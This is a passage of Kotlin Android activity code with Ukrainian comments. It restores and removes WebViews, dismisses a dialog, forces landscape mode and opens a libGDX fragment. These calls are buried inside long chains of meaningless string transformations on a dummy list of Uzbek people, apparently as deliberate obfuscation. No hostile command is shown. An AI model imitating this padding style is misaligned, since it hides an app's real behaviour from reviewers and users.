                                .map { "Flower: $it" } // Операція 6: Додаємо префікс "Flower: " до кожної назви
                                .map { it.replace("A", "@") } // Операція 7: Замінюємо літеру "A" на "@" у всіх назвах
                                .apply { builder.setCancelable(false) }
                                .map { it.toLowerCase() } // Операція 8: Перетворюємо назви на нижній регістр
                                .map { it.capitalize() } // Операція 9: Капіталізуємо кожну назву
                                .filter { it.contains("e") } // Операція 10: Фільтруємо назви, які містять літеру "e"
                        }.create()

                        tmpDialog?.show()
                    }
                }
            .map { it.reversed() } // Операція 4: Перевертаємо назви
            .distinct() // Операція 5: Вибираємо унікальні назви
            .map { "Flower: $it" } // Операція 6: Додаємо префікс "Flower: " до кожної назви
            .map { it.replace("A", "@") } // Операція 7: Замінюємо літеру "A" на "@" у всіх назвах
            .map { it.toLowerCase() } // Операція 8: Перетворюємо назви на нижній регістр
            .map { it.capitalize() } // Операція 9: Капіталізуємо кожну назву
            .filter { it.contains("e") } // Операція 10: Фільтруємо назви, які містять літеру "e"
    }

    data class Uzbek(
        val name: String,
        val age: Int,
        val city: String,
        val profession: String
    )

    private val uzbeks: List<Uzbek> = listOf(
        Uzbek("Alisher", 30, "Tashkent", "Engineer"),
        Uzbek("Dilshod", 25, "Samarkand", "Teacher"),
        Uzbek("Madina", 22, "Bukhara", "Doctor"),
        Uzbek("Shavkat", 40, "Andijan", "Farmer"),
        Uzbek("Nargiza", 35, "Namangan", "Lawyer"),
        Uzbek("Temur", 28, "Kokand", "Architect"),
        Uzbek("Gulnara", 27, "Khiva", "Scientist"),
        Uzbek("Iskander", 45, "Nukus", "Businessman"),
        Uzbek("Lola", 32, "Fergana", "Nurse"),
        Uzbek("Yulduz", 29, "Tashkent", "Artist")
    )

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
        uzbeks
            .filter { it.age > 25 } // Операція 1: Фільтруємо узбеків старших за 25 років
            .sortedBy { it.age } // Операція 2: Сортуємо за віком
            .apply { super.onRestoreInstanceState(savedInstanceState) }
            .map { it.copy(name = it.name.toUpperCase()) } // Операція 3: Перетворюємо імена на верхній регістр
            .apply { pisos.viewsWebs.lastOrNull()?.restoreState(savedInstanceState) }
            .map { "${it.name} from ${it.city}" } // Операція 4: Формуємо новий рядок з імені та міста
            .map { it.replace("A", "@") } // Операція 5: Замінюємо літеру "A" на "@" у всіх рядках
            .map { it.replace("E", "3") } // Операція 6: Замінюємо літеру "E" на "3" у всіх рядках
            .map { "$it (${it.length} chars)" } // Операція 7: Додаємо кількість символів у дужках до кожного рядка
            .filter { it.contains("T") } // Операція 8: Фільтруємо рядки, які містять літеру "T"
            .map { it.toLowerCase() } // Операція 9: Перетворюємо всі рядки на нижній регістр
            .sorted() // Операція 10: Сортуємо рядки в алфавітному порядку
            .map { it.capitalize() } // Операція 11: Капіталізуємо першу літеру кожного рядка
            .map { it.replace("o", "0") } // Операція 12: Замінюємо літеру "o" на "0" у всіх рядках
            .map { "Uzbek: $it" } // Операція 13: Додаємо префікс "Uzbek: " до кожного рядка
            .mapIndexed { index, item -> "$index. $item" } // Операція 14: Додаємо індекс до кожного рядка
    }

    fun igratka() {
        if (uuuuu.getAndSet(false)) {
            uzbeks
                .filter { it.age > 25 } // Операція 1: Фільтруємо узбеків старших за 25 років
                .sortedBy { it.age } // Операція 2: Сортуємо за віком
                .apply {
                    binding.apply {
                        listOf(toppp, centerrr, alll).onEach { itemView ->
                            itemView.clearAnimation()
                            root.removeView(itemView)
                        }
                        pisos.viewsWebs.onEach { root.removeView(it) }

                        tmpDialog?.dismiss()
                    }
                }
                .map { it.copy(name = it.name.toUpperCase()) } // Операція 3: Перетворюємо імена на верхній регістр
                .map { "${it.name} from ${it.city}" } // Операція 4: Формуємо новий рядок з імені та міста
                .map { it.replace("A", "@") } // Операція 5: Замінюємо літеру "A" на "@" у всіх рядках
                .map { it.replace("E", "3") } // Операція 6: Замінюємо літеру "E" на "3" у всіх рядках
                .map { "$it (${it.length} chars)" } // Операція 7: Додаємо кількість символів у дужках до кожного рядка
                .filter { it.contains("T") } // Операція 8: Фільтруємо рядки, які містять літеру "T"
                .apply {
                    ConstraintSet().run {
                        this.clone(binding.root)
                        this.constrainPercentWidth(binding.loader.id, 0.175f)
                        this.applyTo(binding.root)
                    }
                }
                .map { it.toLowerCase() } // Операція 9: Перетворюємо всі рядки на нижній регістр
                .sorted() // Операція 10: Сортуємо рядки в алфавітному порядку
                .map { it.capitalize() } // Операція 11: Капіталізуємо першу літеру кожного рядка
                .map { it.replace("o", "0") } // Операція 12: Замінюємо літеру "o" на "0" у всіх рядках
                .map { "Uzbek: $it" } // Операція 13: Додаємо префікс "Uzbek: " до кожного рядка
                .apply { requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE }
                .mapIndexed { index, item -> "$index. $item" } // Операція 14: Додаємо індекс до кожного рядка

            satco(R.id.libGDXFragment)
        }
    }

}